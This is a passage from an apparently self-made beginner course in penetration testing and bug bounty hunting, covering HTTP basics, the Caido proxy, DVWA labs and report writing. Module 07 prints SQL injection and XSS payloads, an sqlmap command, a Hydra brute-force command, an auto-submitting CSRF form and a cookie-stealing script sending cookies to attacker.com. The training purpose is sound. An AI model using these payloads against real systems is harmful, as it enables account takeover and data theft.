# Recon Report: Metasploitable 2
**Date:**
**Target IP:**
**Scope:** 192.168.56.0/24

## Executive Summary
[2–3 sentences — what did you find at a high level?]

## Open Ports & Services
| Port | Protocol | Service | Version |
|------|----------|---------|---------|

## Web Directories Discovered
[Interesting paths found by Gobuster]

## Vulnerabilities Flagged by Nikto
[Top 5 most interesting findings]

## Recommended Attack Surface
[Where would you start and why?]
```

```bash
git add .
git commit -m "Module 05 complete - full recon report produced on Metasploitable"
git push origin main
```

> 🏁 **Module 05 Complete.** You think like a hunter now. Time to attack the web.

---

---

# MODULE 06: Web Application Fundamentals 🌍

**Goal:** Understand how web applications work technically. You cannot reliably exploit what you do not understand.

**Time Estimate:** 3–4 hours

---

### How HTTP Works

**A raw HTTP Request:**
```
GET /dvwa/login.php HTTP/1.1
Host: 192.168.56.[TARGET]
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: text/html,application/xhtml+xml
Cookie: PHPSESSID=abc123; security=low
Connection: keep-alive
```

**HTTP Methods:**
| Method | Use |
|---|---|
| `GET` | Retrieve a resource — data in the URL |
| `POST` | Send data — data in the request body |
| `PUT` | Update a resource |
| `DELETE` | Remove a resource |
| `OPTIONS` | Query what methods the server accepts |

**HTTP Status Codes:**
| Code | Meaning |
|---|---|
| `200` | OK |
| `301/302` | Redirect |
| `401` | Unauthorized — not logged in |
| `403` | Forbidden — logged in but no permission |
| `404` | Not Found |
| `500` | Internal Server Error — can indicate vulnerabilities |

---

### Cookies and Sessions

```
Cookie: PHPSESSID=abc123xyz; security=low; remember_me=true
```

- **PHPSESSID** — Session token. Steal this and you steal the session.
- **security=low** — DVWA difficulty flag. Notice a user could change this client-side — that's a vulnerability.
- **remember_me=true** — Persistent login token worth investigating.

**Exercise in Caido:**
1. Log into DVWA
2. Find your session cookie in Caido's proxy history
3. Send the request to Replay
4. Change `security=low` to `security=high`
5. Forward it — does the server trust the client-supplied value?
6. Document what this tells you about client-side trust

---

### Caido Deep Dive

**The Proxy — Reading Every Request:**
With Intercept enabled, every request pauses before reaching the server. Read the raw request carefully before modifying anything. Understanding the baseline is the first step to finding anomalies.

**Replay — The Real Testing Work:**
```
1. Capture a request
2. Send to Replay
3. Change ONE thing at a time
4. Send and observe the response
5. Did the output change? Did an error appear?
6. Document every interesting difference
7. Change it again — keep probing
```

**Search — Finding Hidden Patterns:**
After capturing traffic, search across everything at once:
- `password` — plaintext credentials
- `token` — API keys or CSRF tokens
- `error` — stack traces leaking server internals
- `admin` — privileged endpoints

---

## 🔬 LAB 06: Intercept and Modify HTTP Traffic with Caido

**Task 1 — Intercept a Login Request:**
1. Enable Intercept in Caido
2. Submit the DVWA login form in Firefox
3. The request pauses — document every field
4. Change the password to something wrong — what status code returns?
5. Resend with correct credentials — what changes in the response?

**Task 2 — Analyze Session Cookies:**
1. After login, locate your `PHPSESSID` in Caido
2. Copy it to Obsidian
3. Open a new tab and navigate to DVWA
4. Answer: *"Why does the server recognize you without logging in again?"*

**Task 3 — Probe a Parameter in Replay:**
1. Navigate to: `http://[TARGET]/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit`
2. Capture in Caido → Send to Replay
3. Change `id=1` to: `2`, `99`, `0`, `-1`, `'`
4. Document how the response changes with each value
5. Answer: *"What does the changing response tell you about how this parameter is used?"*

**Task 4 — Use Search Across All Traffic:**
Search for: `password`, `admin`, `error`, `PHPSESSID`
Document every interesting finding.

**Obsidian Note:** `06-Web-Fundamentals/lab06-caido-intercept.md`

```bash
git add .
git commit -m "Module 06 complete - HTTP fundamentals and Caido proxy mastered"
git push origin main
```

> 🏁 **Module 06 Complete.** You speak HTTP now. Time to exploit it.

---

---

# MODULE 07: OWASP Top 10 Vulnerabilities 💥

**Goal:** Learn and exploit the five most relevant vulnerability classes for bug bounty hunting at the beginner level.

**Time Estimate:** 6–10 hours — the most important module in this lab

**All labs performed on DVWA at security level: Low**

---

### Vulnerability 1: SQL Injection (SQLi)

**What it is:** Inserting SQL code into an input field to manipulate the server's database query.

**How it works:**
The app builds: `SELECT * FROM users WHERE id = '[INPUT]';`
You enter: `1' OR '1'='1`
It becomes: `SELECT * FROM users WHERE id = '1' OR '1'='1';`
Result: returns every user because `'1'='1'` is always true.

**Manual testing on DVWA → SQL Injection:**
```
1
1'
1' OR '1'='1
1' OR '1'='1'-- -
1' UNION SELECT null,null-- -
1' UNION SELECT user(),database()-- -
```
Document what each payload returns and why.

**Automated with SQLMap:**
```bash
sqlmap -u "http://192.168.56.[TARGET]/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=[your-id]; security=low" \
  --dbs --batch
```

---

### Vulnerability 2: Cross-Site Scripting (XSS)

**What it is:** Injecting JavaScript into a web page so it executes in another user's browser.

**Test payloads on DVWA → XSS (Reflected):**
```javascript
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
```

**Cookie theft payload:**
```javascript
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```
If this executes in an admin's browser — full account takeover.

**Test Stored XSS on DVWA → XSS (Stored):**
Submit a payload in the Name or Message field. Reload — does it fire on every page load?

---

### Vulnerability 3: Broken Authentication

**What to test:**
- Default credentials (admin/admin, admin/password)
- No account lockout after failed attempts
- Session tokens that never expire
- Predictable session IDs

**Brute force with Hydra:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.56.[TARGET] http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

---

### Vulnerability 4: IDOR (Insecure Direct Object Reference)

**What it is:** Accessing objects you shouldn't be able to by modifying a reference value.

```
/account?id=1001  ← your account
/account?id=1002  ← someone else's account (if IDOR exists)
```

**In Caido Replay:**
1. Capture any request with an ID parameter
2. Systematically change the value: up, down, zero, negative
3. Is the server returning data it shouldn't?

---

### Vulnerability 5: CSRF (Cross-Site Request Forgery)

**What it is:** Tricking an authenticated user's browser into submitting an unwanted request.

**Test on DVWA → CSRF:**
1. Intercept a password change request in Caido
2. Is a CSRF token present? If not, craft this:

```html
<html>
<body onload="document.forms[0].submit()">
<form action="http://[TARGET]/dvwa/vulnerabilities/csrf/" method="GET">
  <input type="hidden" name="password_new" value="hacked">
  <input type="hidden" name="password_conf" value="hacked">
  <input type="hidden" name="Change" value="Change">
</form>
</body>
</html>
```
Open while logged into DVWA — if the password changes, CSRF is confirmed.

---

## 🔬 LAB 07: DVWA Full Exploitation Challenge

**Objective:** Exploit all 5 vulnerabilities and write a professional finding for each one.

**Finding Template — use this for every vulnerability:**

```markdown
## Finding: [Vulnerability Name]

### Severity: [Critical / High / Medium / Low]

### Description
[What is it and how does it work?]

### Proof of Concept
[Numbered steps — exact enough for a stranger to reproduce]

### Evidence
[Caido captures, screenshots, command output]

### Impact
[What could a real attacker specifically do?]

### Remediation
[How should the developer fix it?]
```

Save all 5 findings in: Obsidian → `07-OWASP-Top10/`

```bash
git add .
git commit -m "Module 07 complete - OWASP Top 10 exploited and documented on DVWA"
git push origin main
```

> 🏁 **Module 07 Complete.** Phase 2 done. Time to hunt for real.

---

---

# MODULE 08: Bug Bounty Hunting in the Wild 🌐

**Goal:** Transition from lab targets to real, legal bug bounty programs.

**Time Estimate:** Ongoing — this phase never truly ends

---

### Set Up Your Accounts

- **HackerOne:** https://hackerone.com — complete your profile fully
- **Bugcrowd:** https://bugcrowd.com — complete your profile fully
- **Open Bug Bounty:** https://openbugbounty.org — great for first submissions

---

### Understanding Scope

> *If it is not explicitly in scope, do not touch it.*

```
✅ IN SCOPE:          ❌ OUT OF SCOPE:
*.example.com         blog.example.com
api.example.com       Third-party services
                      Social engineering
```

**Reward ranges:**
| Severity | Typical Payout |
|---|---|
| Critical (RCE, Auth Bypass) | $5,000 – $100,000+ |
| High (SQLi, IDOR) | $1,000 – $10,000 |
| Medium (XSS, CSRF) | $100 – $2,000 |
| Low (Info Disclosure) | $50 – $500 |

---

### Your Beginner Hunting Workflow

```
1. Pick a program with wide web scope and high response rate
2. 1 hour passive recon (subdomains, cert transparency, Google dorks)
3. 1 hour active recon (Gobuster, Nikto on in-scope targets)
4. Focus on IDOR and XSS first
5. When you find something — stop exploiting and write your report
6. Submit and move to the next target
```

---

### Writing Reports That Get Paid

```markdown
## Title
[Vulnerability Type] in [Feature] allows [Impact]

## Severity
[Critical/High/Medium/Low]

## Summary
[2–3 sentences: what, where, impact]

## Steps to Reproduce
1. Navigate to [exact URL]
2. Enter [exact payload] in [field]
3. Click [button]
4. Observe: [what happens]

## Proof of Concept
[Caido captures, screenshots]

## Impact
[Specific business consequence]

## Remediation
[Specific, actionable fix]
```

---

## 🔬 LAB 08: Write Your First Bug Report

**Task 1:** Select your strongest finding from Lab 07

**Task 2:** Write a complete professional report using the template above

**Task 3:** Self-review checklist:
```
[ ] Title is specific and clear without reading the full report
[ ] Steps are numbered and exact enough for a stranger to follow
[ ] Proof of concept is clear (Caido captures / screenshots)
[ ] Impact is described in business terms
[ ] Remediation is specific and actionable
[ ] Spelling and grammar are clean
```

**Task 4:** Study 5 real disclosed reports at https://hackerone.com/hacktivity

**Task 5:** Save to `08-Bug-Bounty/lab08-first-report.md`

```bash
git add .
git commit -m "Module 08 complete - first professional bug report written"
git push origin main
```

> 🏁 **Module 08 Complete.** You're hunting. Let's make it portfolio-ready.

---

---

# MODULE 09: Documentation & Portfolio Building 📁

**Goal:** Transform Zero2Hunter into a professional, employer-ready portfolio project.

---

### Final Repository Structure

```
Zero2Hunter/
├── README.md
├── progress/
│   └── module-[00-09]-complete.md
├── recon/
│   ├── target-profile.md
│   └── nmap-scans/
├── findings/
│   ├── README.md                 ← Findings index
│   ├── finding-01-sqli.md
│   ├── finding-02-xss.md
│   ├── finding-03-broken-auth.md
│   ├── finding-04-idor.md
│   └── finding-05-csrf.md
├── labs/
│   └── [lab output files]
├── reports/
│   └── lab08-first-report.md
└── scripts/
    └── [any automation scripts]
```

---

### Skills Badges for Your README

```markdown
![Parrot OS](https://img.shields.io/badge/Parrot_OS-21BBBB?style=flat&logo=linux&logoColor=white)
![Caido](https://img.shields.io/badge/Caido-Web_Proxy-orange?style=flat)
![VMware](https://img.shields.io/badge/VMware-607078?style=flat&logo=vmware&logoColor=white)
![Nmap](https://img.shields.io/badge/Nmap-4D4D4D?style=flat)
![Python](https://img.shields.io/badge/Python-3776AB?style=flat&logo=python&logoColor=white)
![SQLMap](https://img.shields.io/badge/SQLMap-CC0000?style=flat)
```

---

### Findings Index Template

In `findings/README.md`:

```markdown
# Vulnerability Findings Index

| # | Vulnerability | Severity | Target | Date |
|---|--------------|----------|--------|------|
| 01 | SQL Injection | High | DVWA / Metasploitable | |
| 02 | Stored XSS | Medium | DVWA / Metasploitable | |
| 03 | Broken Authentication | Medium | DVWA / Metasploitable | |
| 04 | IDOR | High | DVWA / Metasploitable | |
| 05 | CSRF | Medium | DVWA / Metasploitable | |
```

---

### Your Certification Roadmap

```
NOW — Free Practice
├── TryHackMe: Jr Penetration Tester path (free tier)
└── HackTheBox Starting Point (free machines)

FIRST CERT (6–12 months)
└── eJPT by eLearnSecurity (~$200) — beginner, practical exam
    OR CompTIA Security+ (~$370) — most recognized entry-level cert

INTERMEDIATE (1–2 years)
└── BSCP — Burp Suite Certified Practitioner
    Study free at: portswigger.net/web-security

ADVANCED (2–4 years)
└── OSCP — the gold standard everything here builds toward
```

---

## 🔬 LAB 09: Publish Your Portfolio

**Task 1:** Polish every section of the README with real dates, real IPs, and links to your best findings

**Task 2:** Add skills badges to the README

**Task 3:** Build the findings index in `findings/README.md`

**Task 4:** Final commit:
```bash
git add .
git commit -m "Module 09 complete - Zero2Hunter v1.0 portfolio published"
git push origin main
```

**Task 5:** Share your repo link in at least one cybersecurity community

> 🏁 **Module 09 Complete. Zero2Hunter v1.0 is live.**

---

---

# 📊 Progress Tracker

```
PHASE 1 — Foundation
──────────────────────────────────────────────────
[ ] Module 00: Prerequisites & Environment Setup
[ ] Module 01: Parrot OS Attacker Machine
[ ] Module 02: Target Lab (Metasploitable + DVWA)
[ ] Module 03: Virtual Network Architecture

PHASE 2 — Skills
──────────────────────────────────────────────────
[ ] Module 04: Hacker Toolkit
[ ] Module 05: Recon & OSINT
[ ] Module 06: Web Application Fundamentals
[ ] Module 07: OWASP Top 10 Vulnerabilities

PHASE 3 — Hunt
──────────────────────────────────────────────────
[ ] Module 08: Bug Bounty Hunting in the Wild
[ ] Module 09: Documentation & Portfolio Building

STRETCH GOALS
──────────────────────────────────────────────────
[ ] First HackerOne report submitted
[ ] First bug bounty reward received (any amount)
[ ] eJPT certification earned
[ ] 10 VulnHub machines completed
[ ] TryHackMe Jr Pentester path completed
[ ] First CVE or public disclosure credited
[ ] Zero2Hunter repo reaches 50 GitHub stars
```

---

# 📚 Free Resources

| Resource | Type | URL |
|---|---|---|
| TryHackMe | Interactive labs | https://tryhackme.com |
| HackTheBox | CTF + machines | https://hackthebox.com |
| PortSwigger Web Academy | Web hacking curriculum | https://portswigger.net/web-security |
| OWASP | Documentation | https://owasp.org |
| HackerOne Hacktivity | Real disclosed reports | https://hackerone.com/hacktivity |
| VulnHub | Vulnerable VMs | https://vulnhub.com |
| GTFOBins | Linux privilege escalation | https://gtfobins.github.io |
| PayloadsAllTheThings | Payload reference | https://github.com/swisskyrepo/PayloadsAllTheThings |
| CyberChef | Encoding/decoding | https://gchq.github.io/CyberChef |
| Caido Documentation | Caido user guide | https://docs.caido.io |

---

# ⚖️ Legal & Ethical Disclaimer

All techniques documented in this repository are practiced exclusively on:
- Intentionally vulnerable virtual machines owned by the author
- Systems for which explicit written permission has been granted
- Designated legal practice platforms (TryHackMe, HackTheBox, etc.)

Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide. The author accepts no responsibility for misuse of any information in this project.

**Always hack ethically. Always hack legally.**

---

*Built with 💀 by [Your Name] | Zero knowledge → Bug Bounty Hunter | Zero2Hunter v1.0*
